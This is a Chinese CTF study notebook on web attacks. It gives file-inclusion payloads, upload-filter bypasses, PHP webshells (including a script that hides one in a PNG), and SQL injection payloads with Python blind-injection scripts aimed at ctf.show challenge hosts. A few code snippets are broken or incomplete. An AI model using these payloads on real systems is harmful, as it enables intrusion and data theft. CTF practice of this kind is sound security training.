# 老记不住的命令
开启apache
```shell
/etc/init.d/apache2 start
/etc/init.d/apache2 status

xdg-open .   这会打开当前目录所在的文件浏览器窗口，显示当前目录的内容。
```
在Linux中解压tar.gz文件可以使用以下命令：

Copy<br />tar -zxvf filename.tar.gz<br />其中，参数含义如下：

-z：表示需要使用gzip来解压缩文件；<br />-x：表示需要提取文件；<br />-v：表示在终端输出详细信息；<br />-f：表示后面接的是文件名。
# 奇怪的题

- web224 
- web 225 
- web 227
- web 240
- web243
- web 248
- web 125 web 126
- web 128
- web 133
- web 135
- web141 - 144
- web262
- web 263
- web 339
## 做题思路

- 扫目录
- 尝试是否有源码泄露：.hg源码泄漏 .git源码泄漏 .DS_Store文件泄漏，还有以.phps .bak结尾的网页

## 做题注意点

-  flag可能存在于burp包中的很多位置，要仔细看 
-  构造完payload后，要注意检查源代码，flag可能存在于源代码中 
-  burp中里面的空格有时需要用%20代替 
-  
   - 第一行的post数据要放在一行
   - 最后提交的数据要和前面的有空行

# 1.文件包含

### 做题步骤

-  php伪协议读取文件 
-  php://input，接着用post查询目录 
```php
<?php system('ls')?>
```
 

### file include filter

-  php伪协议：<br />常用的协议是：php://filter/read=convert.base64-encode/resource=xxx.php <br />常用的filter:<br />[PHP: 可用过滤器列表 - Manual](https://www.php.net/manual/zh/filters.php)<br />`convert.iconv.[]`过滤器，`[]`中支持以下字符编码（* 表示该编码也可以在正则表达式中使用<br />支持的编码：[PHP: 支持的字符编码 - Manual](https://www.php.net/manual/zh/mbstring.supported-encodings.php) 
| 名称 | 描述 |
| --- | --- |
| `resource=<要过滤的数据流>` | 这个参数是必须的。它指定了你要筛选过滤的数据流。 |
| `read=<读链的筛选列表>` | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`&#124;`<br />）分隔。 |
| `write=<写链的筛选列表>` | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`&#124;`<br />）分隔。 |
| `<；两个链的筛选列表>` | 任何没有以 `read=`<br /> 或 `write=`<br /> 作前缀 的筛选器列表会视情况应用于读或写链。 |

   -  这里不再用read 
```
filename=php://filter/convert.iconv.UCS-4BE/resource=/var/www/html/flag.php
```
 

   -  尝试编码方式，这个意思就是过滤器对，但是需要和其他的结合
   -  用UCS-4*发现没报错
   -  所以把这两个合起来,UCS-4*.UTF-7 

### data协议

-  `PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码

```
/?c=data://text/plain,<?php system('ls');?>
```
 

-  include后面有后缀时，不影响代码的执行
   - 仍然可以用上面的payload

### 日志包含

#### 原理

-  Apache运行后一般默认会生成两个日志文件，这两个文件是**access.log**(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。 
-  当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/。Apache会记录请求“”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞 

#### 日志目录

-  apache一般是/var/log/apache/access.log。
-  [nginx](https://so.csdn.net/so/search?q=nginx&spm=1001.2101.3001.7020)的log在/var/log/nginx/access.log和/var/log/nginx/error.log 

#### 具体操作

-  用burp抓包，在User-Agent后加🐎，然后包含日志文件 
```php
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36<?php phpinfo();?>
```
 

-  也可以直接在get中传参，再包含日志文件 
```
/?<php phpinfo();?>
/?file=
```
 

# 2.文件上传
## 花式绕过

**检查文件内容是否有php字符串**

-  利用php短标签绕过 
```php
<?=phpinfo();?>
#相当于
<?php echo phpinfo()?>
#也就是说原来的函数还会被执行，就是输出一下，且绕过了检测
```
 

**检查后缀中是否有htaccess或php**

- 上传.user.ini+图片马绕过

**检查文件头部信息**

- 在文件头部添加一个图片的文件头，比如`GIF89a`

**检查文件MIME类型**

- 修改上传时的Content-Type

### 后缀限制

-  一种是Web中间件的解析漏洞 , 因为已经知道中间件是Apache2 , 使用的是PHP . 所以无非就是Apache解析漏洞或者PHP CGI解析漏洞 

#### 绕过正则

-  通过目录特性绕过 
```php
if ($_SESSION['admin']) {
   $con = $_POST['con'];
   $file = $_POST['file'];
   $filename = "backup/".$file;
   #backup/a.php

   if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
      die("Bad file extension");
   }else{
        chdir('uploaded');
       $f = fopen($filename, 'w');
       fwrite($f, $con);
       fclose($f);
   }
 }
```
ua 

-  可以看到只对最后一个.进行了限制，因此可以`../flag.php/.`，或者`../1.php/2.php/..`，前面的..主要是为了把上传的文件放在Uploaded目录下，不加..会放在uploaded/backup目录下。 
### 伪装一句话木马
#### 用{}代替[]
```php
<?php eval($_POST{1});?>
```
#### array_pop

- $_POST是一个数组，在本地测试下面代码。array_pop会弹出数组的最后一个值
```php
<?php
var_dump(array_pop($_POST))
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667114797008-a822bd76-4664-43bc-88e1-cf630bc42b3f.png#averageHue=%23fbfbfb&clientId=u01a61b20-a623-4&from=paste&height=668&id=u30739dda&originHeight=1336&originWidth=1375&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94107&status=done&style=none&taskId=u00b28ce3-9519-43fd-a6d6-e3fe8bcf8a5&title=&width=687.5)

- 可以看到会输出我输入的post内容，因此可用该方式构造一句话木马。

### 绕过对<?php?>的限制

- .user.ini + 日志包含
- auto_append_file=/var/log/nginx/access.log
- 在user-agent中写一句话木马


## 常用方法
### 判断检测位置
#### 改前端允许上传类型

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667051789911-27095240-3989-46c3-bc5e-a15c8038f8e6.png#averageHue=%23fbfaf9&clientId=u34549cc1-4da6-4&from=paste&height=163&id=ub30f55fd&originHeight=326&originWidth=1672&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71491&status=done&style=none&taskId=u9170560e-9e92-423d-9571-af943e5cf2d&title=&width=836)

- 这里把accept的参数由images改为file
#### 判断报错原因
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667051979704-d147007c-3349-462b-a87b-137f29236fe5.png#averageHue=%23e8aa7b&clientId=uc3b466fa-fc50-4&from=paste&height=256&id=u9c8267a4&originHeight=511&originWidth=1378&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71549&status=done&style=none&taskId=ud7faf40b-3ae0-4fb2-9721-c2dfa15a6bf&title=&width=689)

- 把错误输出放到Console中，这里提示我们要改Content-type
- 这里也不一定，也可能是文件内容有问题，可以依次删除部分文件内容进行测试
#### 改filename的后缀
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667050589002-83ed8ac1-b14e-4897-bfcc-cb6cba4d6ec4.png#averageHue=%23f0efef&clientId=u560ee73b-5943-4&from=paste&height=122&id=UclTR&originHeight=243&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11990&status=done&style=none&taskId=u7b351a54-fb85-4b02-b234-42c54e53531&title=&width=342.5)
#### 改content-type

- image/jpg image/png image/gif image/jpeg
#### 添加文件头

- GIF89a

#### 改上传图片的大小

- 设置成32x32的
### .user.ini 
```php
auto_append_file=1.txt
```

- 只有**当前目录**下的.php文件会包含1.txt
- 假设上传目录是upload，那访问/upload，有文字，说明存在upload.php

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668430245690-d5e32180-75fa-4e72-935e-a08323e650f9.png#averageHue=%23fefdfc&clientId=u0b2cd0b1-2ee1-4&from=paste&height=188&id=u8aba3589&originHeight=375&originWidth=1577&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54841&status=done&style=none&taskId=u84e7b2b3-d0e3-477f-82a6-dd02e5e9820&title=&width=788.5)
#### +include(web 159)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667116302067-5c8e56ee-5f1f-40b1-827b-4419ba8967bb.png#averageHue=%23efecec&clientId=u01a61b20-a623-4&from=paste&height=97&id=u76f6abd6&originHeight=193&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10132&status=done&style=none&taskId=u8170e8dc-8a58-4bd0-acad-fb5457a999b&title=&width=331.5)

- 这里不让用（）-->语言结构可以绕过括号的限制
- .user.ini中让php文件包含2.png，2.png中包含日志文件
- 在user-agent中上传一句话

##### +对空格限制
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667118360279-2efde37d-6abd-42ed-b430-6c51610b4205.png#averageHue=%23f5f2f2&clientId=u01a61b20-a623-4&from=paste&height=89&id=u5bc2d6f9&originHeight=178&originWidth=610&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5967&status=done&style=none&taskId=ub7b3bc15-091e-4313-8502-045eb39c51a&title=&width=305)

- include后可以没有空格

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667118469872-b964e4a4-2e8e-40b0-8d65-e3be66bad859.png#averageHue=%23f6f0f0&clientId=u01a61b20-a623-4&from=paste&height=74&id=JOrK4&originHeight=148&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6354&status=done&style=none&taskId=u93314510-6fda-46e5-b67b-87d1d0be292&title=&width=292.5)

- 加一个标记，在hex中修改，31是1的16进制的ASCII码，改成0a。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667118448189-be56d775-686c-4c04-b41d-90a5aeb2bbe0.png#averageHue=%23eae8e8&clientId=u01a61b20-a623-4&from=paste&height=66&id=u324950cb&originHeight=132&originWidth=1076&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11503&status=done&style=none&taskId=u24946377-f2ea-49fd-a4f9-9f187b35a24&title=&width=538)
#### 对点(.)进行过滤

- 文件内容中不能有点，因此无法进行日志包含
- 上传一个.user.ini，包含一个名称为22的文件

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668481781576-4a88fceb-6d66-43c8-94d8-253ac023cb14.png#averageHue=%23f0efef&clientId=u6a08d332-4457-4&from=paste&height=107&id=udd1190c9&originHeight=214&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11633&status=done&style=none&taskId=uc3cdf427-42fe-4101-8c68-8868a9bd08c&title=&width=388.5)

- 上传22文件，包含一个url，该url是长地址(ip地址可以转换为长地址)，因此没有点。
- 访问该地址会返回一个一句话木马

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668482076606-e2f7514e-3de0-42ba-868a-857b95d6194d.png#averageHue=%23f5f3f3&clientId=u6a08d332-4457-4&from=paste&height=79&id=uc3779c95&originHeight=158&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5922&status=done&style=none&taskId=u64bdbf82-1500-4962-8ef7-5a477481b26&title=&width=316)
#### ini配置文件包含

- 直接在ini配置文件中包含url

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668482419138-aef604c7-bff2-4fc8-ab2c-985a7cb6cf10.png#averageHue=%23f3f0f0&clientId=u6a08d332-4457-4&from=paste&height=104&id=ufa2bb930&originHeight=207&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9876&status=done&style=none&taskId=u86039cdf-0f00-401c-a8d8-5b41c0c30f4&title=&width=389)

##### +日志包含
```shell
auto_append_file=/var/log/nginx/access.log
```

- 如果当前目录没有index.php，那么就自己上传一个

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668525228277-f1bef240-dd66-46df-96c0-5edc26a1c3b4.png#averageHue=%23f8f6f6&clientId=uf6afd272-8243-4&from=paste&height=168&id=ud113c588&originHeight=335&originWidth=1779&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43621&status=done&style=none&taskId=ub1eaca0b-4275-47e2-aac5-206d558a12c&title=&width=889.5)

- 上传后，有数据了，说明存在index.php，上传成功了




### 绕过二次渲染
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668517464234-88517611-64a5-47fa-a1bb-9de5dc361765.png#averageHue=%23eae9e8&clientId=uf6afd272-8243-4&from=paste&height=306&id=u13f59fa6&originHeight=611&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200010&status=done&style=none&taskId=u72a351ab-5b68-4b5c-91c3-3b04e3e613a&title=&width=458.5)
#### png二次渲染

- 一个网站只能上传正常的png图片

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668486486398-cb5dc953-504a-4ee6-b5cb-2c8b0413a57e.png#averageHue=%23f4f3f1&clientId=u6a08d332-4457-4&from=paste&height=36&id=ub7503981&originHeight=72&originWidth=1716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24389&status=done&style=none&taskId=u6b968cfe-5038-4d1a-b7c1-42cf5c40bdc&title=&width=858)

- 上传后，发现可能存在图片包含，可能进行了二次渲染

绕过二次渲染的脚本：
```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>

```

- 该代码会生成1.png，其中包含<?=$_GET[0]($_POST[1]);?>
- 上传该图片，用post发送数据包，0=system，1=ls

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668485846868-01add022-fc14-4f54-bf02-6de59d3352a5.png#averageHue=%23f7f7f7&clientId=u6a08d332-4457-4&from=paste&height=422&id=CcrhC&originHeight=843&originWidth=2322&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76423&status=done&style=none&taskId=uf3201ace-cc65-407d-aca7-b39ab715dac&title=&width=1161)<br />**注意点：上传post数据包，不能只是把get改成post，要用hackbar执行之后抓包**
#### jpg二次渲染
### 文件包含

- 页面要求上传一个zip文件，上传后返回结果如下

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668518680928-0182ccf2-49cc-4f49-b304-731b654ee4c9.png#averageHue=%23f2f2f2&clientId=uf6afd272-8243-4&from=paste&height=407&id=u5fc78cd9&originHeight=814&originWidth=2450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83349&status=done&style=none&taskId=u766e2e2e-fde5-4d36-b6d8-6fcd7ac1c76&title=&width=1225)

- 这里看到被解析了，且是压缩包的内容，那说明可能存在文件包含
- 直接用记事本打开压缩包，在最后添加一句话木马，再次上传
### .htaccess

- 使用该功能需要Apache在配置文件中设置AllowOverride All , 并且启用Rewrite模块 
- .htaccess文件是Apache服务器下的一个配置文件。其主要负责相关目录下的网页配置，即：在一个特定的文档目录中放置一个包含一个或多个指令的文件来对网页进行配置。
- .htaccess文件的作用域为**其所在目录与其所有的子目录**，不过若是子目录也存在.htaccess文件，会覆盖父目录的.htaccess文件
```shell
<ifModule mime_module>

AddHandler php5-script .jpg
<!-- 将.jpg文件按照php代码进行解析执行 -->

AddType application/x-httpd-php .jpg
<!-- 将.jpg文件按照php代码进行解析执行 -->

Sethandler application/x-httpd-php
<!-- 将该目录及子目录下的文件均按照php文件解析执行 -->

</ifModule>
<!-- 该种匹配方式并不推荐，极易造成误伤 -->


<FilesMatch "muma.jpg">

Sethandler application/x-httpd-php
<!-- 将匹配到的 muma.jpg 文件按照php解析执行 -->

Addhandler php5-script .jpg
<!-- 将匹配到的 muma.jpg 文件按照php解析执行 -->

</FilesMatch>
<!-- 该种匹配方式较为精准，不会造成大批的误伤情况 -->

```

- 如果上传后报错，可能是需要改Content-type

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668520731558-52aa0e7c-f39c-47d5-8551-08a1c6b6befc.png#averageHue=%23f7f6f6&clientId=uf6afd272-8243-4&from=paste&height=389&id=ubdeb254c&originHeight=777&originWidth=2203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68052&status=done&style=none&taskId=u164dd345-c6ce-461f-baf9-7d61e17d7e6&title=&width=1101.5)







# 3.sql注入

##  爆破信息

- mysql5.0以上，有information_schema这个库
- information_schema这个库,MySQL的所有数据库名、表名、字段名都可以从中查询到。

### 爆破表名

```sql
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

- group_concat将结果以一行输出

**注意点：**

使用下面的绕过方法时，要看好对应数据库存储数据库名称的列名，不一定都是`**table_schema=database()**`

#### 绕过informaiton_schema数据库
[https://blog.csdn.net/qq_45521281/article/details/106647880](https://blog.csdn.net/qq_45521281/article/details/106647880)
##### sys.schema_auto_increment_columns

- 该视图的作用就是用来对表自增ID的监控
- 也就是有自增id的表会查出来

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668088704511-02ca692a-3c51-4461-b65f-5542c4ecf803.png#averageHue=%23f5f4f4&clientId=ud5afecba-3310-4&from=paste&height=44&id=uf7965903&originHeight=88&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35148&status=done&style=none&taskId=u2d64f1ac-fb29-434b-9738-41c8a43a592&title=&width=957.5)
##### sys.schema_table_statistics_with_buffer

- 查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间
- **没有自增id的表也会查出来**

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668088812219-d977821f-dbb2-4ef2-b0fb-c6beb22945fd.png#averageHue=%23e8e8e7&clientId=ud5afecba-3310-4&from=paste&height=71&id=ua2f29d65&originHeight=142&originWidth=2293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56860&status=done&style=none&taskId=u84de71a1-ba4e-46e1-bbb5-885aa410df3&title=&width=1146.5)
##### [mysql.innodb_table_stats](https://mariadb.com/kb/en/mysqlinnodb_table_stats/)/mysql.innodb_table_index 

- 这两个库也存有库名和表名

### 爆破列名

-  这里假设表名是manage_user，要加单引号，如果报错，那就把Manage_user转成16进制，前面要加0x 
```sql
select group_concat(column_name) from information_schema.columns where table_name='manage_user'
#16进制
select group_concat(column_name) from information_schema.columns where table_name=0x6d616e6167655f75736572
```
 
#### 无列名查询
[https://zhuanlan.zhihu.com/p/98206699](https://zhuanlan.zhihu.com/p/98206699)

- 原来1,2,3分别对应的是id,username,password
```sql
select 1,2,3 union SELECT * FROM user
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668090362307-376f0571-640b-4540-941d-a4cbf73ac217.png#averageHue=%23edeceb&clientId=ud5afecba-3310-4&from=paste&height=187&id=u92efe8ca&originHeight=374&originWidth=206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25638&status=done&style=none&taskId=u6470b27c-aa1e-4b6d-a7d9-cdaf5823d1b&title=&width=103)                                                     ![查password列](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668090483901-9e3d96a0-2187-4216-84a6-dda2ed780674.png#averageHue=%23efeeed&clientId=ud5afecba-3310-4&from=paste&height=180&id=lxA4i&originHeight=360&originWidth=80&originalType=binary&ratio=1&rotation=0&showTitle=true&size=4762&status=done&style=none&taskId=ufa8d6d3d-9347-4b52-a349-33251ec7b80&title=%E6%9F%A5password%E5%88%97&width=40 "查password列")

- 查出第3列即password列的内容
```sql
select `3` from (select 1,2,3 union select * from user)a;#见上图，查password列
```

- 当反引号被过滤时，使用别名替代
```sql
select b from (select 1,2,3 as b union select * from admin)a;
```
**注意点：这里在爆破信息时，前端有可能只能显示一行，因此要用limit限制，但一行会是1,2,3，所以要limit 1,1**

- 同时查询多个列
```sql
select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;
```
### 爆破具体信息

```sql
select group_concat(m_name,'++++',m_pwd) from manage_user
```

**注意点：**

- 表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。
-  表名、字段名、数据库名等可用反引号 ( ` )，也可以不使用反引号 ，
- 但**如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错**

如果columns的名称是flag?，就需要使用反引号
```sql
select `flag?` from flag
```

### 绕过group_concat

- 用limit绕过
```sql
select table_name from information_schema.tables where table_schema=database() limit 0,1
```

- 索引从0开始，1表示查多少行数据
## 
## 内联注释

-  在使用ordey by后发现，不让用union select，可以使用内联注释绕过 
```sql
http://61.147.171.105:62646/view.php?no=-1 union/**/select 1,2,3,4 --+
```
 

   - 记得用注释把后面的东西注释掉
   - --+不行换# 或者%23
-  查看当前用户权限，如果是root，使用load_file()加载文件，可能可以直接加载出flag.php。 
-  如果上一步没报错，查看网页源代码，就可能获得flag 

## 神奇的union select

- Union select是联合查询，意思就是不管前面的sql语句是否报错，union select的都能执行

### ssrf读取文件

[攻防世界 (xctf.org.cn)](https://adworld.xctf.org.cn/challenges/write-up?hash=c500b9d0-d809-4879-a7a8-5b12da735c57_2)

-  在第四个本应是data的数据位置，构造一个反序列化数据，相当于把这个赋值给url 
```
/view.php?no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

### 偷梁换柱

-  这里我用union select获取信息 
```sql
select username,password from user where username !='flag' and id = '99999' UNION SELECT id,password from user WHERE username='flag' limit 1
```

##  Handler查询

[https://blog.csdn.net/JesseYoung/article/details/40785137](https://blog.csdn.net/JesseYoung/article/details/40785137)

-  当不让用select查询时，可以用Handler 
```
http://61.147.171.105:64583/?inject=1';handler `1919810931114514` open as `a`;handler `a` read next;%23
```
 
## 数值型注入

-  输入下面的内容使sql恒成立，这里有可能需要用**内联注释** 
```sql
?id=1/**/or/**/1=1
```
 

-  使sql恒不成立 
```sql
?id=-1/**/or/**/1=2
```
 

-  结果1显示全部表，结果2为空，则可能存在数值型注入 

py脚本

```python
import requests
 
url = 'http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/'
name = ''
 
# 循环45次( 循环次数按照返回的字符串长度自定义)
for i in range(1, 45):
    # 获取当前使用的数据库
    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    # 获取当前数据库的所有表
    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    # 获取flag表的字段
    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'
    # 获取flag表的数据
    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('正在获取第 %d 个字符' % i)
    # 截取SQL查询结果的每个字符, 并判断字符内容
    for j in range(31, 128):
        result = requests.get(url + payload % (i, j))
 
        if 'If' in result.text:
            name += chr(j)
            print('数据库名/表名/字段名/数据: %s' % name)
            break
 
        # 如果某个字符不存在,则停止程序
        count += 1
        if count >= (128 - 31):
            exit()
```
## like操作符

```sql
SELECT * FROM Persons WHERE City LIKE '%lon%'
```

- %是通配符

### REGEXP 操作符

[MySQL 正则表达式 | 菜鸟教程 (runoob.com)](https://www.runoob.com/mysql/mysql-regexp.html)

-  MySQL中使用 REGEXP 操作符来进行正则表达式匹配 
-  括号中的参数要有单引号 
```sql
select pass from user where pass regexp('ctfshow{')
```
##  or '字符串'
```sql
select username from user where username='' or '1' //后面的where恒成立，会返回所有数据
select username from user where username='' or '1aaaa' //同上
select username from user where username='' or 'aaaa'//or后的条件是不成立的
select username from user where username='' or '0aaaa'//or后的条件是不成立的
```
## right join
### 01
![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216120213-220c2dc1-88c8-44b6-823b-1fe7fb12c3e8.png#averageHue=%23fbf9f8&from=url&id=TJywZ&originHeight=809&originWidth=1133&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 02
![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216592628-7fbea62a-1757-4b3c-ae43-5a06b3d082f2.png#averageHue=%23fcf7f7&from=url&id=uzvu3&originHeight=798&originWidth=1488&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- **为什么是三行？**首先，前两行必定满足要求，首字母为"c"，因此写上。而：
- ![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216695798-7a37eaac-38f2-48b9-96d8-5b614a6853c7.png#averageHue=%23f5dfdd&from=url&id=Orhzj&originHeight=205&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

不满足情况，但是因为是右连接，所以第三行为 null,null,null,addfg,adsad
### 03

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216770108-1b4701f7-3131-4d5f-be88-1f98d1582cf9.png#averageHue=%23fdfcfc&from=url&id=sqBqd&originHeight=818&originWidth=1537&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />可以看到，比较的是第一个字符，如果写上regexp('ctf')肯定一个都不匹配，根据右连接的性质，所以为这样。

注：右连接表示user as b里的条目要全<br />![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216871539-3ddcd0e9-8ccb-423a-86ef-955008ff90fb.png#averageHue=%23fbf9f8&from=url&id=qub5O&originHeight=928&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## mysql char函数

- char函数返回字符的ASCII码
```php
select pass from ctfshow_user group by pass having pass regexp('ctfshow{')
select pass from ctfshow_user group by pass having pass regexp(0x63746673686f777b)
select pass from ctfshow_user group by pass having pass regexp(concat(char('c') + char(t)```))
```

- 如果过滤了单引号，那么最后一行的sql变为：先求字符'c'的ASCII码假定为x，由x个true相加获得c字符
## 花式绕过

### with rollup

要求：`if($password==$row['password'])`

-  with rollup会把group by的值再进行排列，并在末尾有一个汇总行，为[null,前面所有值的和]<br />使用group by的输出

使用with rollup
-  这就在最后多了一行密码为空，因此不输密码，即可让该if判断正确 
### 万能密码

```sql
'1 or 1=1 %23
```

### 绕过空格
#### %0a
#### %0c
#### 内联注释/**/
#### 反引号+单引号

```sql
select tableName from `ctfshow_user`where`pass`like'%c%'
```

#### ()

- **任何地方都能用，很好用，首选用这个**

MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格

```sql
select(user())from dual where(1=1)and(2=2)
```

-  例子： 
```sql
(ctfshow_user)where(pass)like'a%'
```
 

### 绕过#

#### %23

#### where 1=1

-  注意这里要跟在fromxxx表后面

```sql
-1'union%0cselect%0cgroup_concat(password),1,2%0cfrom%0cctfshow_user%0cwhere%0c'1=1
```
 

   - 显然不能用or取代where

#### or指定查询

```sql
'or(id=26)and'1=1
```

### 绕过单引号'

-  正常情况下，regexp中的参数要有单引号 
```sql
select pass from ctfshow_user group by pass having pass regexp('ctfshow{')
```
 

-  这个题对单引号进行过滤，用**16进制绕过** 
```sql
select pass from ctfshow_user group by pass having pass regexp(0x63746673686f777b)
```

#### 字符串转16进制

- 也就是用hackbar的16进制编码(hexadecimal encode)

```python
def str2hex(str):
    result = ''
    for x in str:
        result += hex(ord(x))
    return result.replace("0x","")
```

- ord返回字符的ASCII码，10进制，即a会返回97
#### 反引号
```sql
select username from user where username = `admin`
```
### 绕过where

去官网查资料，一大堆[MySQL :: MySQL 5.7 Reference Manual](https://dev.mysql.com/doc/refman/5.7/en/)

- group by having
- right join
### 绕过数字(web 185)
```sql
select true //返回1
```

- 用多个true相加代替数字 

### 绕过substr(mysql)

- left、right
- [LPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_lpad)

Returns the string _**str**_, left-padded with the string _**padstr**_ to a length of _**len**_ characters. If _**str**_ is longer than _**len**_, the return value is shortened to _**len**_ characters.
```sql
select left('str',2)//返回结果为'st'
SELECT LPAD('hi',4,'??');
        -> '??hi'
SELECT LPAD('hi',1,'??');
        -> 'h'
```
## 常用payload
### bool盲注(web174)
#### 步骤

- 抓包获取地址
- 测试得到两种返回值
- if判断条件，if(a>b,1,0)
- 可能有两种情况
   - flag不在当前表中，**二分法**依次爆破表名等信息
   - 在当前表，**直接设置flag中可能出现的值**，regexp

题目对返回结果存在过滤，因此不能直接显示，用脚本返回flag的ascii码值。 
```python
 requests

url = "http://fd909245-0044-46ca-9159-bced302c1766.challenge.ctf.show/api/v4.php?id=1' and "


result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))>{mid},1,0) -- -'
        r = requests.get(url + payload)
        if "admin" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```
```sql
substr((函数),1,1)//别忘记函数处要有括号
```
#### 注意点
**使用regexp时，通常要和substr一起用**
```python
flag = "123456789abcdefghijklmnopqrstuvwx}yz-{"
result = ''
for x in flag:
	select group_concat(f1ag) from ctfshow_fl0g REGEXP('{result + x}')
```

- 这里这样写显然不合理，假设存在一个值1ad和一个f1ad，那么它匹配的结果就会是1ad
- 所以要一个字符一个字符的判断，使用substr

#### 页面返回值判断
```python
r = requests.post(url, data=data)
if "密码错误" == r.json()['msg']:
    result = result + x
    print(result)
    break
```
